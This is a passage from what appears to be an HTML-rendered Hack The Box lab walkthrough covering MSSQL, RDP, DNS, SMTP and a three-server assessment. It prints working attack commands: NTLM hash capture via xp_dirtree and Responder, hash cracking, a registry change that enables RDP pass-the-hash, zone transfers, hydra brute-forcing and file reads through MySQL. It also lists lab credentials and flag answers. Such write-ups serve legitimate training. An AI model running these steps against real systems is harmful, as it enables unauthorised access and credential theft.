<span class="normal"><a href="#__codelineno-211-13">13</a></span>
<span class="normal"><a href="#__codelineno-211-14">14</a></span>
<span class="normal"><a href="#__codelineno-211-15">15</a></span>
<span class="normal"><a href="#__codelineno-211-16">16</a></span>
<span class="normal"><a href="#__codelineno-211-17">17</a></span>
<span class="normal"><a href="#__codelineno-211-18">18</a></span>
<span class="normal"><a href="#__codelineno-211-19">19</a></span>
<span class="normal"><a href="#__codelineno-211-20">20</a></span>
<span class="normal"><a href="#__codelineno-211-21">21</a></span>
<span class="normal"><a href="#__codelineno-211-22">22</a></span>
<span class="normal"><a href="#__codelineno-211-23">23</a></span>
<span class="normal"><a href="#__codelineno-211-24">24</a></span>
<span class="normal"><a href="#__codelineno-211-25">25</a></span>
<span class="normal"><a href="#__codelineno-211-26">26</a></span>
<span class="normal"><a href="#__codelineno-211-27">27</a></span>
<span class="normal"><a href="#__codelineno-211-28">28</a></span>
<span class="normal"><a href="#__codelineno-211-29">29</a></span>
<span class="normal"><a href="#__codelineno-211-30">30</a></span>
<span class="normal"><a href="#__codelineno-211-31">31</a></span>
<span class="normal"><a href="#__codelineno-211-32">32</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-211-1"><a id="__codelineno-211-1" name="__codelineno-211-1"></a># Connect to the db using mssqlclient impacket
</span><span id="__span-211-2"><a id="__codelineno-211-2" name="__codelineno-211-2"></a>mssqlclient.py -p 1433 htbdbuser@$ip
</span><span id="__span-211-3"><a id="__codelineno-211-3" name="__codelineno-211-3"></a># Enter creds when prompted
</span><span id="__span-211-4"><a id="__codelineno-211-4" name="__codelineno-211-4"></a>
</span><span id="__span-211-5"><a id="__codelineno-211-5" name="__codelineno-211-5"></a># Whoami
</span><span id="__span-211-6"><a id="__codelineno-211-6" name="__codelineno-211-6"></a>select user_name();
</span><span id="__span-211-7"><a id="__codelineno-211-7" name="__codelineno-211-7"></a>
</span><span id="__span-211-8"><a id="__codelineno-211-8" name="__codelineno-211-8"></a># List users:
</span><span id="__span-211-9"><a id="__codelineno-211-9" name="__codelineno-211-9"></a>SELECT name FROM master..syslogins
</span><span id="__span-211-10"><a id="__codelineno-211-10" name="__codelineno-211-10"></a># The one we are looking for is not present.
</span><span id="__span-211-11"><a id="__codelineno-211-11" name="__codelineno-211-11"></a>
</span><span id="__span-211-12"><a id="__codelineno-211-12" name="__codelineno-211-12"></a># We will try to capture MSSQL Service Hash by using `xp_dirtree` undocumented stored procedures.
</span><span id="__span-211-13"><a id="__codelineno-211-13" name="__codelineno-211-13"></a># In our attacker machine open a new terminal and set a responder listener
</span><span id="__span-211-14"><a id="__codelineno-211-14" name="__codelineno-211-14"></a>sudo responder -I tun0
</span><span id="__span-211-15"><a id="__codelineno-211-15" name="__codelineno-211-15"></a>
</span><span id="__span-211-16"><a id="__codelineno-211-16" name="__codelineno-211-16"></a># In the already connected mssql command line: 
</span><span id="__span-211-17"><a id="__codelineno-211-17" name="__codelineno-211-17"></a>EXEC master..xp_dirtree &#39;\\$ipAttacker\share&#39;
</span><span id="__span-211-18"><a id="__codelineno-211-18" name="__codelineno-211-18"></a>
</span><span id="__span-211-19"><a id="__codelineno-211-19" name="__codelineno-211-19"></a># The responder listener will print:
</span><span id="__span-211-20"><a id="__codelineno-211-20" name="__codelineno-211-20"></a>NTLMv2-SSP Hash     : mssqlsvc::WIN-02:5b55e0dc6b4e012d:9061B752E27B9DC08B778088A813DDF6:0101000000000000801A85C76927DB01E0A642B53DA7BF6000000000020008004A00420059004F0001001E00570049004E002D0037003500460059004F0055004F00540052004F00360004003400570049004E002D0037003500460059004F0055004F00540052004F0036002E004A00420059004F002E004C004F00430041004C00030014004A00420059004F002E004C004F00430041004C00050014004A00420059004F002E004C004F00430041004C0007000800801A85C76927DB0106000400020000000800300030000000000000000000000000300000ABE564474E572C0FDA65F14FE47C49910CF6D5E2D84E98065E4910B32B2B9D850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380034000000000000000000
</span><span id="__span-211-21"><a id="__codelineno-211-21" name="__codelineno-211-21"></a>
</span><span id="__span-211-22"><a id="__codelineno-211-22" name="__codelineno-211-22"></a># Let&#39;s save it to a file
</span><span id="__span-211-23"><a id="__codelineno-211-23" name="__codelineno-211-23"></a>echo &quot;mssqlsvc::WIN-02:5b55e0dc6b4e012d:9061B752E27B9DC08B778088A813DDF6:0101000000000000801A85C76927DB01E0A642B53DA7BF6000000000020008004A00420059004F0001001E00570049004E002D0037003500460059004F0055004F00540052004F00360004003400570049004E002D0037003500460059004F0055004F00540052004F0036002E004A00420059004F002E004C004F00430041004C00030014004A00420059004F002E004C004F00430041004C00050014004A00420059004F002E004C004F00430041004C0007000800801A85C76927DB0106000400020000000800300030000000000000000000000000300000ABE564474E572C0FDA65F14FE47C49910CF6D5E2D84E98065E4910B32B2B9D850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380034000000000000000000&quot; &gt; hash.txt
</span><span id="__span-211-24"><a id="__codelineno-211-24" name="__codelineno-211-24"></a>
</span><span id="__span-211-25"><a id="__codelineno-211-25" name="__codelineno-211-25"></a># And now... crack it with John the ripper
</span><span id="__span-211-26"><a id="__codelineno-211-26" name="__codelineno-211-26"></a> john -w=/usr/share/wordlists/rockyou.txt hash.txt
</span><span id="__span-211-27"><a id="__codelineno-211-27" name="__codelineno-211-27"></a> ```
</span><span id="__span-211-28"><a id="__codelineno-211-28" name="__codelineno-211-28"></a>
</span><span id="__span-211-29"><a id="__codelineno-211-29" name="__codelineno-211-29"></a>Results: princess1
</span><span id="__span-211-30"><a id="__codelineno-211-30" name="__codelineno-211-30"></a>
</span><span id="__span-211-31"><a id="__codelineno-211-31" name="__codelineno-211-31"></a>
</span><span id="__span-211-32"><a id="__codelineno-211-32" name="__codelineno-211-32"></a>**Enumerate the &quot;flagDB&quot; database and submit a flag as your answer.**
</span></code></pre></div></td></tr></table></div>
<h1 id="we-know-that-user-mssqlsvcprincess1-is-part-of-the-windows-authentication-so-we-login-into-the-service-with-those-creds">We know that user mssqlsvc:princess1 is part of the windows authentication, so we login into the service with those creds:</h1>
<p>mssqlclient.py -p 1433 mssqlsvc@$ip -windows-auth</p>
<h1 id="and-enter-the-password">and enter the password</h1>
<h1 id="list-databases">List databases</h1>
<p>SELECT name FROM master.dbo.sysdatabases</p>
<h1 id="lets-see-tables-in-flagdb">Let's see tables in flagDB</h1>
<p>SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES</p>
<h1 id="ok-we-need-to-select-the-db-before-asking-for-its-contents">Ok, we need to select the DB before asking for its contents</h1>
<p>USE flagDB</p>
<h1 id="now-print-the-content-of-the-table">Now print the content of the table:</h1>
<p>SELECT * FROM tb_flag
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-212-1">1</a></span>
<span class="normal"><a href="#__codelineno-212-2">2</a></span>
<span class="normal"><a href="#__codelineno-212-3">3</a></span>
<span class="normal"><a href="#__codelineno-212-4">4</a></span>
<span class="normal"><a href="#__codelineno-212-5">5</a></span>
<span class="normal"><a href="#__codelineno-212-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-212-1"><a id="__codelineno-212-1" name="__codelineno-212-1"></a>Results: HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}
</span><span id="__span-212-2"><a id="__codelineno-212-2" name="__codelineno-212-2"></a>
</span><span id="__span-212-3"><a id="__codelineno-212-3" name="__codelineno-212-3"></a>### RDP
</span><span id="__span-212-4"><a id="__codelineno-212-4" name="__codelineno-212-4"></a>RDP to  with user &quot;htb-rdp&quot; and password &quot;HTBRocks!&quot;
</span><span id="__span-212-5"><a id="__codelineno-212-5" name="__codelineno-212-5"></a>
</span><span id="__span-212-6"><a id="__codelineno-212-6" name="__codelineno-212-6"></a>**What is the name of the file that was left on the Desktop? (Format example: filename.txt).**
</span></code></pre></div></td></tr></table></div>
xfreerdp /d:$domain] /u:$user /p:$pass /v:$ip
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-213-1">1</a></span>
<span class="normal"><a href="#__codelineno-213-2">2</a></span>
<span class="normal"><a href="#__codelineno-213-3">3</a></span>
<span class="normal"><a href="#__codelineno-213-4">4</a></span>
<span class="normal"><a href="#__codelineno-213-5">5</a></span>
<span class="normal"><a href="#__codelineno-213-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-213-1"><a id="__codelineno-213-1" name="__codelineno-213-1"></a>Results: pentest-notes.txt
</span><span id="__span-213-2"><a id="__codelineno-213-2" name="__codelineno-213-2"></a>
</span><span id="__span-213-3"><a id="__codelineno-213-3" name="__codelineno-213-3"></a>
</span><span id="__span-213-4"><a id="__codelineno-213-4" name="__codelineno-213-4"></a>**Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?**
</span><span id="__span-213-5"><a id="__codelineno-213-5" name="__codelineno-213-5"></a>
</span><span id="__span-213-6"><a id="__codelineno-213-6" name="__codelineno-213-6"></a>Reading the file pentest-notes.txt
</span></code></pre></div></td></tr></table></div>
We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.</p>
<p>User: Administrator
Hash: 0E14B9D6330BF16C30B1924111104824
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-214-1">1</a></span>
<span class="normal"><a href="#__codelineno-214-2">2</a></span>
<span class="normal"><a href="#__codelineno-214-3">3</a></span>
<span class="normal"><a href="#__codelineno-214-4">4</a></span>
<span class="normal"><a href="#__codelineno-214-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-214-1"><a id="__codelineno-214-1" name="__codelineno-214-1"></a>Which means that RDP connection with pass the hash needs some troubleshooting. 
</span><span id="__span-214-2"><a id="__codelineno-214-2" name="__codelineno-214-2"></a>*Restricted Admin Mode*, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:
</span><span id="__span-214-3"><a id="__codelineno-214-3" name="__codelineno-214-3"></a>
</span><span id="__span-214-4"><a id="__codelineno-214-4" name="__codelineno-214-4"></a>```powershell
</span><span id="__span-214-5"><a id="__codelineno-214-5" name="__codelineno-214-5"></a>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
</span></code></pre></div></td></tr></table></div></p>
<p>Results: DisableRestrictedAdmin</p>
<p><strong>Connect via RDP with the Administrator account and submit the flag.txt as you answer.</strong></p>
<p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-215-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-215-1"><a id="__codelineno-215-1" name="__codelineno-215-1"></a>xfreerdp /d:$domain /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /v:$ip 
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>HTB{RDP_P4$$_Th3_H4$#}</code></p>
<h3 id="dns_1">DNS</h3>
<p>Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-216-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-216-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-216-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-216-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-216-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-216-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-216-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-216-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-216-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-216-10">10</a></span>
<span class="normal"><a href="#__codelineno-216-11">11</a></span>
<span class="normal"><a href="#__codelineno-216-12">12</a></span>
<span class="normal"><a href="#__codelineno-216-13">13</a></span>
<span class="normal"><a href="#__codelineno-216-14">14</a></span>
<span class="normal"><a href="#__codelineno-216-15">15</a></span>
<span class="normal"><a href="#__codelineno-216-16">16</a></span>
<span class="normal"><a href="#__codelineno-216-17">17</a></span>
<span class="normal"><a href="#__codelineno-216-18">18</a></span>
<span class="normal"><a href="#__codelineno-216-19">19</a></span>
<span class="normal"><a href="#__codelineno-216-20">20</a></span>
<span class="normal"><a href="#__codelineno-216-21">21</a></span>
<span class="normal"><a href="#__codelineno-216-22">22</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-216-1"><a id="__codelineno-216-1" name="__codelineno-216-1"></a># Enumerate subdomains
</span><span id="__span-216-2"><a id="__codelineno-216-2" name="__codelineno-216-2"></a>dnsenum --dnsserver 10.129.86.251 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
</span><span id="__span-216-3"><a id="__codelineno-216-3" name="__codelineno-216-3"></a># you will get the following subdomains:
</span><span id="__span-216-4"><a id="__codelineno-216-4" name="__codelineno-216-4"></a># ns.inlanefreight.htb, control.inlanefreight.htb, helpdesk.inlanefreight.htb
</span><span id="__span-216-5"><a id="__codelineno-216-5" name="__codelineno-216-5"></a>
</span><span id="__span-216-6"><a id="__codelineno-216-6" name="__codelineno-216-6"></a>
</span><span id="__span-216-7"><a id="__codelineno-216-7" name="__codelineno-216-7"></a># Install subbrute
</span><span id="__span-216-8"><a id="__codelineno-216-8" name="__codelineno-216-8"></a>git clone https://github.com/TheRook/subbrute.git &gt;&gt; /dev/null 2&gt;&amp;1
</span><span id="__span-216-9"><a id="__codelineno-216-9" name="__codelineno-216-9"></a>
</span><span id="__span-216-10"><a id="__codelineno-216-10" name="__codelineno-216-10"></a># Access the tool
</span><span id="__span-216-11"><a id="__codelineno-216-11" name="__codelineno-216-11"></a>cd subbrute
</span><span id="__span-216-12"><a id="__codelineno-216-12" name="__codelineno-216-12"></a>
</span><span id="__span-216-13"><a id="__codelineno-216-13" name="__codelineno-216-13"></a># Configure resolver file 
</span><span id="__span-216-14"><a id="__codelineno-216-14" name="__codelineno-216-14"></a>echo &quot;ns.inlanefreight.htb&quot; &gt; ./resolvers.txt
</span><span id="__span-216-15"><a id="__codelineno-216-15" name="__codelineno-216-15"></a>
</span><span id="__span-216-16"><a id="__codelineno-216-16" name="__codelineno-216-16"></a># Enumerate subdomains with subbrute
</span><span id="__span-216-17"><a id="__codelineno-216-17" name="__codelineno-216-17"></a>python3 subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
</span><span id="__span-216-18"><a id="__codelineno-216-18" name="__codelineno-216-18"></a># You will get the following subdomains:
</span><span id="__span-216-19"><a id="__codelineno-216-19" name="__codelineno-216-19"></a># hr.inlanefreight.htb
</span><span id="__span-216-20"><a id="__codelineno-216-20" name="__codelineno-216-20"></a>
</span><span id="__span-216-21"><a id="__codelineno-216-21" name="__codelineno-216-21"></a># Attempt a zone transfer
</span><span id="__span-216-22"><a id="__codelineno-216-22" name="__codelineno-216-22"></a> dig AXFR @ns.inlanefreight.htb hr.inlanefreight.htb 
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-217-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-217-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-217-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-217-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-217-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-217-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-217-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-217-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-217-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-217-10">10</a></span>
<span class="normal"><a href="#__codelineno-217-11">11</a></span>
<span class="normal"><a href="#__codelineno-217-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-217-1"><a id="__codelineno-217-1" name="__codelineno-217-1"></a>; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; AXFR @ns.inlanefreight.htb hr.inlanefreight.htb
</span><span id="__span-217-2"><a id="__codelineno-217-2" name="__codelineno-217-2"></a>; (1 server found)
</span><span id="__span-217-3"><a id="__codelineno-217-3" name="__codelineno-217-3"></a>;; global options: +cmd
</span><span id="__span-217-4"><a id="__codelineno-217-4" name="__codelineno-217-4"></a>hr.inlanefreight.htb.   604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
</span><span id="__span-217-5"><a id="__codelineno-217-5" name="__codelineno-217-5"></a>hr.inlanefreight.htb.   604800  IN  TXT &quot;HTB{LUIHNFAS2871SJK1259991}&quot;
</span><span id="__span-217-6"><a id="__codelineno-217-6" name="__codelineno-217-6"></a>hr.inlanefreight.htb.   604800  IN  NS  ns.inlanefreight.htb.
</span><span id="__span-217-7"><a id="__codelineno-217-7" name="__codelineno-217-7"></a>ns.hr.inlanefreight.htb. 604800 IN  A   127.0.0.1
</span><span id="__span-217-8"><a id="__codelineno-217-8" name="__codelineno-217-8"></a>hr.inlanefreight.htb.   604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
</span><span id="__span-217-9"><a id="__codelineno-217-9" name="__codelineno-217-9"></a>;; Query time: 40 msec
</span><span id="__span-217-10"><a id="__codelineno-217-10" name="__codelineno-217-10"></a>;; SERVER: 10.129.86.251#53(ns.inlanefreight.htb) (TCP)
</span><span id="__span-217-11"><a id="__codelineno-217-11" name="__codelineno-217-11"></a>;; WHEN: Fri Nov 01 14:34:47 EDT 2024
</span><span id="__span-217-12"><a id="__codelineno-217-12" name="__codelineno-217-12"></a>;; XFR size: 5 records (messages 1, bytes 230)
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>HTB{LUIHNFAS2871SJK1259991}</code></p>
<h3 id="smtp_1">SMTP</h3>
<p><strong>What is the available username for the domain inlanefreight.htb in the SMTP server?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-218-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-218-1"><a id="__codelineno-218-1" name="__codelineno-218-1"></a>smtp-user-enum -M RCPT -U users.list  -D inlanefreight.htb -t $ip
</span></code></pre></div></td></tr></table></div>
<p>Results: marlin</p>
<p><strong>Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-219-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-219-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-219-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-219-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-219-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-219-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-219-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-219-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-219-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-219-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-219-1"><a id="__codelineno-219-1" name="__codelineno-219-1"></a>hydra -l marlin@inlanefreight.htb -P passwords.list -f $ip pop3
</span><span id="__span-219-2"><a id="__codelineno-219-2" name="__codelineno-219-2"></a># It will return the password: poohbear
</span><span id="__span-219-3"><a id="__codelineno-219-3" name="__codelineno-219-3"></a>
</span><span id="__span-219-4"><a id="__codelineno-219-4" name="__codelineno-219-4"></a># Now connect to POP server
</span><span id="__span-219-5"><a id="__codelineno-219-5" name="__codelineno-219-5"></a>telnet $ip 110
</span><span id="__span-219-6"><a id="__codelineno-219-6" name="__codelineno-219-6"></a>USER marlin@inlanefreight.htb
</span><span id="__span-219-7"><a id="__codelineno-219-7" name="__codelineno-219-7"></a>PASS poohbear
</span><span id="__span-219-8"><a id="__codelineno-219-8" name="__codelineno-219-8"></a>STATS
</span><span id="__span-219-9"><a id="__codelineno-219-9" name="__codelineno-219-9"></a>LIST
</span><span id="__span-219-10"><a id="__codelineno-219-10" name="__codelineno-219-10"></a>RETR 1
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>HTB{w34k_p4$$w0rd}</code></p>
<h3 id="skills-assessment_3">Skills Assessment</h3>
<p>We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format: - <code>HTB{...}</code>. Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.</p>
<p><strong>EASY. You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-220-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-220-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-220-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-220-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-220-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-220-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-220-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-220-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-220-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-220-10">10</a></span>
<span class="normal"><a href="#__codelineno-220-11">11</a></span>
<span class="normal"><a href="#__codelineno-220-12">12</a></span>
<span class="normal"><a href="#__codelineno-220-13">13</a></span>
<span class="normal"><a href="#__codelineno-220-14">14</a></span>
<span class="normal"><a href="#__codelineno-220-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-220-1"><a id="__codelineno-220-1" name="__codelineno-220-1"></a>sudo nmap -sC -sV -Pn $ip
</span><span id="__span-220-2"><a id="__codelineno-220-2" name="__codelineno-220-2"></a>echo &quot;$ip    inlanefreight.htb&quot; | sudo tee -a /etc/host
</span><span id="__span-220-3"><a id="__codelineno-220-3" name="__codelineno-220-3"></a>
</span><span id="__span-220-4"><a id="__codelineno-220-4" name="__codelineno-220-4"></a># Download the users.list from HTB or you will go bananas
</span><span id="__span-220-5"><a id="__codelineno-220-5" name="__codelineno-220-5"></a>smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t $ip 
</span><span id="__span-220-6"><a id="__codelineno-220-6" name="__codelineno-220-6"></a># As a result you get fiona@inlanefreight.htb exists
</span><span id="__span-220-7"><a id="__codelineno-220-7" name="__codelineno-220-7"></a>
</span><span id="__span-220-8"><a id="__codelineno-220-8" name="__codelineno-220-8"></a># Password attack
</span><span id="__span-220-9"><a id="__codelineno-220-9" name="__codelineno-220-9"></a>hydra -l fiona@inlanefreight.htb -P passwords.list -t 64 -f $ip smtp
</span><span id="__span-220-10"><a id="__codelineno-220-10" name="__codelineno-220-10"></a># Result: [25][smtp] host: 10.129.179.42   login: fiona@inlanefreight.htb   password: 987654321
</span><span id="__span-220-11"><a id="__codelineno-220-11" name="__codelineno-220-11"></a>
</span><span id="__span-220-12"><a id="__codelineno-220-12" name="__codelineno-220-12"></a># Now we login into the service mysql
</span><span id="__span-220-13"><a id="__codelineno-220-13" name="__codelineno-220-13"></a>mysql -u fiona -p&quot;987654321&quot; -h $ip
</span><span id="__span-220-14"><a id="__codelineno-220-14" name="__codelineno-220-14"></a>
</span><span id="__span-220-15"><a id="__codelineno-220-15" name="__codelineno-220-15"></a>SELECT LOAD_FILE(&quot;C:/Users/Administrator/Desktop/flag.txt&quot;);
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}</code></p>
<p>The second server is an internal server (within the <code>inlanefreight.htb</code> domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.</p>
<p><strong>MEDIUM: Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-221-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-221-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-221-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-221-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-221-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-221-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-221-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-221-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-221-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-221-10">10</a></span>
<span class="normal"><a href="#__codelineno-221-11">11</a></span>
<span class="normal"><a href="#__codelineno-221-12">12</a></span>
<span class="normal"><a href="#__codelineno-221-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-221-1"><a id="__codelineno-221-1" name="__codelineno-221-1"></a>sudo nmap -sC -sV -Pn -p- $ip
</span><span id="__span-221-2"><a id="__codelineno-221-2" name="__codelineno-221-2"></a>
</span><span id="__span-221-3"><a id="__codelineno-221-3" name="__codelineno-221-3"></a>ftp $ip 30021
</span><span id="__span-221-4"><a id="__codelineno-221-4" name="__codelineno-221-4"></a># Enter as creds anonymous:anonymous
</span><span id="__span-221-5"><a id="__codelineno-221-5" name="__codelineno-221-5"></a># dir
</span><span id="__span-221-6"><a id="__codelineno-221-6" name="__codelineno-221-6"></a># cd simon
</span><span id="__span-221-7"><a id="__codelineno-221-7" name="__codelineno-221-7"></a># mget *.txt
</span><span id="__span-221-8"><a id="__codelineno-221-8" name="__codelineno-221-8"></a># quit
</span><span id="__span-221-9"><a id="__codelineno-221-9" name="__codelineno-221-9"></a>
</span><span id="__span-221-10"><a id="__codelineno-221-10" name="__codelineno-221-10"></a>ssh simon@$ip
</span><span id="__span-221-11"><a id="__codelineno-221-11" name="__codelineno-221-11"></a># Enter password 8Ns8j1b!23hs4921smHzwn
</span><span id="__span-221-12"><a id="__codelineno-221-12" name="__codelineno-221-12"></a>
</span><span id="__span-221-13"><a id="__codelineno-221-13" name="__codelineno-221-13"></a>cat flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{1qay2wsx3EDC4rfv_M3D1UM}</p>
<p><strong>Hard. The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.</strong> </p>
<p>What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-222-1">1</a></span>
<span class="normal"><a href="#__codelineno-222-2">2</a></span>
<span class="normal"><a href="#__codelineno-222-3">3</a></span>
<span class="normal"><a href="#__codelineno-222-4">4</a></span>
<span class="normal"><a href="#__codelineno-222-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-222-1"><a id="__codelineno-222-1" name="__codelineno-222-1"></a>smbclient -L \\$ip -U simon 
</span><span id="__span-222-2"><a id="__codelineno-222-2" name="__codelineno-222-2"></a>
</span><span id="__span-222-3"><a id="__codelineno-222-3" name="__codelineno-222-3"></a>smbclient  \\\\$ip\\Home -U simon -N
</span><span id="__span-222-4"><a id="__codelineno-222-4" name="__codelineno-222-4"></a>cd IT
</span><span id="__span-222-5"><a id="__codelineno-222-5" name="__codelineno-222-5"></a>cd Simon
</span></code></pre></div></td></tr></table></div>
<p>Results: random.txt</p>
<p>Enumerate the target and find a password for the user Fiona. What is her password?</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-223-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-223-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-223-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-223-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-223-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-223-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-223-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-223-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-223-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-223-10">10</a></span>
<span class="normal"><a href="#__codelineno-223-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-223-1"><a id="__codelineno-223-1" name="__codelineno-223-1"></a>smbclient -L \\$ip -U simon 
</span><span id="__span-223-2"><a id="__codelineno-223-2" name="__codelineno-223-2"></a>
</span><span id="__span-223-3"><a id="__codelineno-223-3" name="__codelineno-223-3"></a>smbclient  \\\\$ip\\Home -U simon -N
</span><span id="__span-223-4"><a id="__codelineno-223-4" name="__codelineno-223-4"></a>cd IT
